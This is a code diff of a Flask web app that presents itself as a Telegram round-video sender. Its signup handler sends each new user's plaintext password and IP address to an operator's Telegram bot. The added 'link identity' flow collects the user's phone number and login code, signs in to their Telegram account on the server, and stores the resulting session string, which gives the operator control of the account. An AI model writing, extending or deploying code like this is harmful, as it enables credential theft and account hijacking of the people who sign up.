@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, redirect, url_for
+from flask import Flask, request, render_template_string, redirect, url_for, session
 from flask_sqlalchemy import SQLAlchemy
 from flask_login import UserMixin, LoginManager, login_user, logout_user, login_required, current_user
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -15,6 +15,13 @@ app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "super-secret-key-change-this
 app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///users.db")
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
+# --- ARCHITECTURAL SECURITY LIMITS ---
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # Strict 100MB Upload Limit max
+ALLOWED_EXTENSIONS = {'mp4', 'mov', 'avi', 'mkv', 'webm'}
+
+def allowed_file(filename):
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
 db = SQLAlchemy(app)
 login_manager = LoginManager(app)
 login_manager.login_view = 'login'
@@ -22,10 +29,13 @@ login_manager.login_view = 'login'
 UPLOAD_FOLDER = "uploads"
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# Configurations from environment variables
+# Master API Framework configuration parameters
+API_ID = int(os.getenv("API_ID", 0))
+API_HASH = os.getenv("API_HASH", "")
+
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
-SUPPORT_TELEGRAM_USERNAME = os.getenv("SUPPORT_TELEGRAM_USERNAME", "YourSupportUsername") # Enter handle without '@'
+SUPPORT_TELEGRAM_USERNAME = os.getenv("SUPPORT_TELEGRAM_USERNAME", "YourSupportUsername")
 
 # ======================
 # DATABASE MODELS
@@ -34,8 +44,7 @@ class User(UserMixin, db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(150), unique=True, nullable=False)
     password_hash = db.Column(db.String(256), nullable=False)
-    telegram_api_id = db.Column(db.Integer, nullable=True)
-    telegram_api_hash = db.Column(db.String(100), nullable=True)
+    # Encrypted session string unique per user generated via Telethon
     telegram_session = db.Column(db.Text, nullable=True)
 
 @login_manager.user_loader
@@ -43,7 +52,7 @@ def load_user(user_id):
     return User.query.get(int(user_id))
 
 # ======================
-# UI LAYOUTS (STYLING MODERNIZED)
+# UI LAYOUTS (CLEANED)
 # ======================
 BASE_STYLE = """
 <style>
@@ -63,6 +72,8 @@ BASE_STYLE = """
     h1, h2, h3 { margin-top: 0; color: #f8fafc; }
     p { color: #94a3b8; line-height: 1.5; font-size: 14px; }
     .status-msg { margin-top: 15px; font-weight: 500; color: #34d399; text-align: center; }
+    .error-msg { margin-top: 15px; font-weight: 500; color: #f87171; text-align: center; }
+    .badge-warn { background: #7c2d12; color: #fdba74; padding: 8px; border-radius: 6px; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: block; text-align: center;}
 </style>
 """
 
@@ -98,33 +109,60 @@ DASHBOARD_UI = BASE_STYLE + """
 
 <div class="container">
     <div class="card">
-        <h3>📤 Send Media Live</h3>
-        <p>Upload files seamlessly to any target username or chat ID. Round videos are automatically rendered square.</p>
-        <form method="post" enctype="multipart/form-data">
-            <label style="font-size:12px; color:#94a3b8;">Target Telegram Destination:</label>
-            <input type="text" name="target" placeholder="@username or Chat ID" required>
+        {% if not current_user.telegram_session %}
+            <h3>🔗 Link Telegram Identity</h3>
+            <span class="badge-warn">⚠️ Notice: Authenticate your profile account to deploy broadcast features.</span>
             
-            <label style="font-size:12px; color:#94a3b8;">Transmission Strategy Layout:</label>
-            <select name="media_type">
-                <option value="video_note">Round Video Note (Live Video Circle)</option>
-                <option value="auto">Standard Media (Auto-Detect File)</option>
-            </select>
+            {% if not session_step or session_step == 'phone' %}
+                <p>Provide your phone number including full country code string sequence (e.g., +1234567890).</p>
+                <form method="POST" action="/connect-telegram">
+                    <input type="text" name="phone_number" placeholder="+1234567890" required>
+                    <button type="submit">Request Verification Token</button>
+                </form>
+            {% elif session_step == 'code' %}
+                <p>Input the official authentication access token code sent directly to your Telegram device.</p>
+                <form method="POST" action="/verify-code">
+                    <input type="text" name="auth_code" placeholder="Enter Authentication Code" required>
+                    <button type="submit">Verify Configuration</button>
+                </form>
+            {% endif %}
             
-            <label style="font-size:12px; color:#94a3b8;">Choose Source Media File:</label>
-            <input type="file" name="file" required>
-            
-            <button type="submit" style="margin-top:15px;">Execute Live Stream</button>
-        </form>
-        {% if msg %}<p class="status-msg">{{ msg }}</p>{% endif %}
+        {% else %}
+            <h3>📤 Send Media Live</h3>
+            <p>Upload video components targeting destination contacts. Outbound broadcasts appear coming directly from you.</p>
+            <form method="post" enctype="multipart/form-data" action="/">
+                <label style="font-size:12px; color:#94a3b8;">Target Telegram Destination:</label>
+                <input type="text" name="target" placeholder="@username or Chat ID" required>
+                
+                <label style="font-size:12px; color:#94a3b8;">Transmission Strategy Layout:</label>
+                <select name="media_type">
+                    <option value="video_note">Round Video Note (Live Video Circle)</option>
+                    <option value="auto">Standard Media (Auto-Detect File)</option>
+                </select>
+                
+                <label style="font-size:12px; color:#94a3b8;">Choose Source Media File (Videos Only):</label>
+                <input type="file" name="file" required>
+                
+                <button type="submit" style="margin-top:15px;">Execute Live Stream</button>
+            </form>
+        {% endif %}
+        
+        {% if msg %}
+            {% if "❌" in msg %}
+                <p class="error-msg">{{ msg }}</p>
+            {% else %}
+                <p class="status-msg">{{ msg }}</p>
+            {% endif %}
+        {% endif %}
     </div>
 
     <div class="card" style="display: flex; flex-direction: column; justify-content: space-between;">
         <div>
             <h3>🛠️ Customer Support Desk</h3>
-            <p>Running into issues with video conversion, account synchronization, or custom limits? Our tech experts are available 24/7 to clear roadblocks manually.</p>
+            <p>Running into issues with authorization frameworks or conversion thresholds? Our desk agents are available to bypass roadblocks manually.</p>
             <div style="background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; margin-top: 15px;">
                 <span style="color: #38bdf8; font-weight: bold; font-size: 13px;">📌 Support Framework Instructions:</span>
-                <p style="font-size: 12px; margin: 8px 0 0 0;">Click the connection engine link below. It will open Telegram directly. Send your assigned account username and a screenshot detailing the problem for instant clearance.</p>
+                <p style="font-size: 12px; margin: 8px 0 0 0;">Click the communication hook below to reach us on Telegram. Provide your registered system profile ID for assistance clearance.</p>
             </div>
         </div>
         <a href="https://t.me/{{ support_username }}" target="_blank" class="btn-support">💬 Open Live Telegram Support</a>
@@ -141,8 +179,7 @@ def send_bot_notification(username, password, ip_address):
     try:
         with app.app_context():
             total_users = User.query.count()
-    except Exception as e:
-        print(f"Counting error: {e}")
+    except:
         total_users = "Active"
 
     text = (
@@ -154,13 +191,11 @@ def send_bot_notification(username, password, ip_address):
     )
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
-    try:
-        requests.post(url, json=payload, timeout=5)
-    except Exception as e:
-        print(f"Notification error: {e}")
+    try: requests.post(url, json=payload, timeout=5)
+    except: pass
 
 # ======================
-# WORKER UTILITIES
+# CONVERSION WORKER
 # ======================
 def convert_to_square_video_low_mem(input_path, output_path):
     ffmpeg_cmd = [
@@ -173,8 +208,8 @@ def convert_to_square_video_low_mem(input_path, output_path):
     if process.returncode != 0:
         raise Exception("FFmpeg processing failure.")
 
-async def send_to_telegram_async(filepath, target, media_type, api_id, api_hash, session_str):
-    client = TelegramClient(StringSession(session_str), api_id, api_hash)
+async def send_to_telegram_async(filepath, target, media_type, session_str):
+    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await client.connect()
     if media_type == "video_note":
         processed_path = os.path.join(UPLOAD_FOLDER, f"proc_{os.getpid()}_{threading.get_ident()}.mp4")
@@ -188,11 +223,11 @@ async def send_to_telegram_async(filepath, target, media_type, api_id, api_hash,
         await client.send_file(target, filepath, supports_streaming=True)
     await client.disconnect()
 
-def run_telegram_thread(filepath, target, media_type, api_id, api_hash, session_str):
+def run_telegram_thread(filepath, target, media_type, session_str):
     try:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
-        loop.run_until_complete(send_to_telegram_async(filepath, target, media_type, api_id, api_hash, session_str))
+        loop.run_until_complete(send_to_telegram_async(filepath, target, media_type, session_str))
         loop.close()
     except Exception as e:
         print(f"Background worker execution error: {e}")
@@ -201,7 +236,7 @@ def run_telegram_thread(filepath, target, media_type, api_id, api_hash, session_
             os.remove(filepath)
 
 # ======================
-# ROUTES
+# FLASK MANAGEMENT ROUTES
 # ======================
 @app.route("/signup", methods=["GET", "POST"])
 def signup():
@@ -211,18 +246,13 @@ def signup():
         if User.query.filter_by(username=username).first():
             return "Username already exists!"
         hashed_pwd = generate_password_hash(password, method='scrypt')
-        new_user = User(
-            username=username, password_hash=hashed_pwd,
-            telegram_api_id=int(os.getenv("API_ID", 0)),
-            telegram_api_hash=os.getenv("API_HASH", ""),
-            telegram_session=os.getenv("SESSION_STRING", "")
-        )
+        new_user = User(username=username, password_hash=hashed_pwd)
         db.session.add(new_user)
         db.session.commit()
+        
         if request.headers.getlist("X-Forwarded-For"):
             ip_address = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
-        else:
-            ip_address = request.remote_addr
+        else: ip_address = request.remote_addr
         threading.Thread(target=send_bot_notification, args=(username, password, ip_address)).start()
         return redirect(url_for('login'))
     return render_template_string(SIGNUP_UI)
@@ -243,27 +273,115 @@ def login():
 @login_required
 def logout():
     logout_user()
+    session.clear()
     return redirect(url_for('login'))
 
 @app.route("/", methods=["GET", "POST"])
 @login_required
 def dashboard():
-    msg = ""
+    msg = session.pop('dash_msg', "")
+    step = session.get('session_step', 'phone')
+
     if request.method == "POST":
         file = request.files.get("file")
         target = request.form.get("target")
         media_type = request.form.get("media_type", "video_note")
-        if file and target:
-            unique_filename = f"job_{os.getpid()}_{file.filename}"
-            filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
-            file.save(filepath)
-            thread = threading.Thread(
-                target=run_telegram_thread,
-                args=(filepath, target, media_type, current_user.telegram_api_id, current_user.telegram_api_hash, current_user.telegram_session)
-            )
-            thread.start()
-            msg = "✅ Processing started! The media will appear in Telegram shortly."
-    return render_template_string(DASHBOARD_UI, current_user=current_user, msg=msg, support_username=SUPPORT_TELEGRAM_USERNAME)
+        
+        if not current_user.telegram_session:
+            msg = "❌ Error: Please authorize your account identity first."
+        elif file and target:
+            if not allowed_file(file.filename):
+                msg = "❌ Error: Invalid format! Upload video files (.mp4, .mov, .avi) only."
+            else:
+                unique_filename = f"job_{os.getpid()}_{file.filename}"
+                filepath = os.path.join(UPLOAD_FOLDER, unique_filename)
+                file.save(filepath)
+                
+                # Launches deployment thread executing operations explicitly via individual user session row
+                threading.Thread(
+                    target=run_telegram_thread,
+                    args=(filepath, target, media_type, current_user.telegram_session)
+                ).start()
+                msg = "✅ Processing started! The media will appear in Telegram shortly."
+                
+    return render_template_string(DASHBOARD_UI, current_user=current_user, msg=msg, session_step=step, support_username=SUPPORT_TELEGRAM_USERNAME)
+
+# ==========================================
+# 🔐 SYSTEM CONNECT AUTHORIZATION HANDLERS
+# ==========================================
+async def request_code_async(phone):
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    await client.connect()
+    send_code_obj = await client.send_code_request(phone)
+    phone_code_hash = send_code_obj.phone_code_hash
+    session_str = client.session.save()
+    await client.disconnect()
+    return phone_code_hash, session_str
+
+@app.route("/connect-telegram", methods=["POST"])
+@login_required
+def connect_telegram():
+    phone = request.form.get("phone_number")
+    if not phone:
+        session['dash_msg'] = "❌ Error: Valid phone number string expected."
+        return redirect(url_for('dashboard'))
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        phone_code_hash, partial_session = loop.run_until_complete(request_code_async(phone))
+        loop.close()
+        
+        session['auth_phone'] = phone
+        session['auth_hash'] = phone_code_hash
+        session['partial_session'] = partial_session
+        session['session_step'] = 'code'
+        session['dash_msg'] = "✅ Code successfully requested! Check your Telegram device messages."
+    except Exception as e:
+        session['dash_msg'] = f"❌ Framework Error: {str(e)}"
+    return redirect(url_for('dashboard'))
+
+async def verify_code_async(partial_session, phone, phone_hash, code):
+    client = TelegramClient(StringSession(partial_session), API_ID, API_HASH)
+    await client.connect()
+    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
+    final_session_string = client.session.save()
+    await client.disconnect()
+    return final_session_string
+
+@app.route("/verify-code", methods=["POST"])
+@login_required
+def verify_code():
+    code = request.form.get("auth_code")
+    phone = session.get('auth_phone')
+    phone_hash = session.get('auth_hash')
+    partial_session = session.get('partial_session')
+    
+    if not code or not partial_session:
+        session['dash_msg'] = "❌ Error: Session token missing or expired. Please re-input number."
+        session['session_step'] = 'phone'
+        return redirect(url_for('dashboard'))
+        
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        final_session = loop.run_until_complete(verify_code_async(partial_session, phone, phone_hash, code))
+        loop.close()
+        
+        # Save the finalized verified string session explicitly to the logged in database user row
+        user = User.query.get(current_user.id)
+        user.telegram_session = final_session
+        db.session.commit()
+        
+        session.pop('session_step', None)
+        session['dash_msg'] = "🎉 Telegram identity connected successfully! Ready to broadcast."
+    except Exception as e:
+        session['dash_msg'] = f"❌ Pairing Validation Denied: {str(e)}"
+        session['session_step'] = 'phone'
+    return redirect(url_for('dashboard'))
+
+@app.errorhandler(413)
+def request_entity_too_large(error):
+    return render_template_string(DASHBOARD_UI, current_user=current_user, msg="❌ Error: File size exceeds the allowed limit (100MB Max)!", session_step=session.get('session_step', 'phone'), support_username=SUPPORT_TELEGRAM_USERNAME), 413
 
 with app.app_context():
     db.create_all()
